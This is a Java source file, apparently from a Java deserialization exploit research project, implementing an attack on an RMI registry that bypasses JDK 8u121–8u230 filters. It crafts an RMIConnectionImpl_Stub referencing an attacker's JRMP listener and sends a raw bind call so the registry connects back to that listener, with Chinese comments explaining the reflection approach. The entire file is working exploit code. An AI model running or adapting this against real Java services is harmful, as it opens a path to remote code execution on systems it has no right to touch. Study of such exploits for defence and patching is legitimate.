package xyz.eki.marshalexp.rmi.attack;

import sun.rmi.server.UnicastRef;
import xyz.eki.marshalexp.rmi.utils.RemoteUtils;

import javax.management.remote.rmi.RMIConnectionImpl_Stub;
import java.rmi.server.ObjID;

/*
Bypass 8u121~8u230
 */
public class AttackRegistryByJRMPListener {
    public static void main(String[] args) {
        try {
            String registryHost = "127.0.0.1";
            int registryPort = 1099;
            String JRMPHost = "127.0.0.1";
            int JRMPPort = 12345;

//            Constructor<?> constructor = UnicastRemoteObject.class.getDeclaredConstructor(null);
//            constructor.setAccessible(true);
//            //因为UnicastRemoteObject的默认构造方式是protect的，所以需要反射调用
//
//            UnicastRemoteObject remoteObject = (UnicastRemoteObject) constructor.newInstance(null);
//            TCPEndpoint ep = (TCPEndpoint) getFieldValve(getFieldValve(getFieldValve(remoteObject,"ref"),"ref"),"ep");
//
//            //这里直接反射修改对应的值，间接修改构造的序列化数据
//            setFieldValue(ep,"port",JRMPPort);
//            setFieldValue(ep,"host",JRMPHost);

            //利用 RMIConnectionImpl_Stub
            java.rmi.server.ObjID objId = new java.rmi.server.ObjID();
            sun.rmi.transport.tcp.TCPEndpoint endpoint = new sun.rmi.transport.tcp.TCPEndpoint(JRMPHost, JRMPPort);
            sun.rmi.transport.LiveRef liveRef = new sun.rmi.transport.LiveRef(objId, endpoint, false);
            UnicastRef ref = new sun.rmi.server.UnicastRef(liveRef);

            RMIConnectionImpl_Stub remote = new RMIConnectionImpl_Stub(ref);

            ObjID objID_ = new ObjID(0);

            //Bind(null,payloadObj)
            RemoteUtils.sendRawCall(registryHost,registryPort,objID_,0,4905912898345647071L,null,remote);



        }catch (Throwable t){
            t.printStackTrace();
        }
    }
}
